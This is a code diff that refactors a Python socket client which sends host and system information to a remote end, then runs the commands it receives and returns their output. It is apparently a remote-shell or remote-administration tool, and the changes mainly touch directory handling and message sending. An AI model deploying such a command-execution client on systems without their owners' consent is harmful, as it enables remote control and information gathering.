@@ -41,13 +41,12 @@ class Client(StreamSocket):
                 return [command.encode(), utils.Ansi.clear(), b""]
 
             if family == "cd":
-                # TODO: fix change_dir from assigning relative path
                 exists, path = self.change_dir(command)
 
                 if exists:
-                    self.LastWD = str(path)
-
-                    return [command.encode(), str(path).encode(), b""]
+                    #self.LastWD = str(path)
+                    #return [command.encode(), str(path).encode(), b""]
+                    return [command.encode(), path.encode(), b""]
                 else:
                     error_msg = f"Cannot resolve path {path}".encode()
                     return [command.encode(), b"", error_msg]
@@ -82,18 +81,15 @@ class Client(StreamSocket):
             establish_msg = self.recv_msg(sock)
             utils.status(establish_msg)
 
-            if utils.OPSYS == "nt":
-                self.LastWD = os.getenv("USERPROFILE")
-            else:
-                self.LastWD = os.getenv("HOME")
-
+            self.LastWD = str(Path.home())
+            os.chdir(str(Path.home()))
             hostinfo, sysinfo = self.get_sysinfo()
 
             # send ==> current user/host information
-            self.send(sock, hostinfo)
+            self.send_msg(sock, hostinfo)
 
             # send ==> system information
-            self.send(sock, sysinfo)
+            self.send_msg(sock, sysinfo)
 
             while True:
                 # receive <== command to execute
@@ -102,17 +98,11 @@ class Client(StreamSocket):
 
                 if family != "exit":
                     cmd_out = self.execute(command)
-                    cmd = bytes(cmd_out[0])
-                    stdout = bytes(cmd_out[1])
-                    stderr = bytes(cmd_out[2])
+                    cmd = cmd_out[0]
+                    stdout = cmd_out[1]
+                    stderr = cmd_out[2]
 
                     if stderr == b"":
-                        if family == "cd":
-                            if stdout == b"":
-                                self.LastWD = cmd.decode().split()[1]
-                            else:
-                                self.LastWD = stdout.decode()
-
                         output = stdout
                         level = "output"
                     else:
@@ -121,7 +111,7 @@ class Client(StreamSocket):
 
                     if self.Debug:
                         # TODO: fix and test debug options
-                        utils.status(bytes(output).decode(), level, command)
+                        utils.status(output.decode(), level, command)
                     elif self.Verbose:
                         utils.stdin_status(command, level)
 
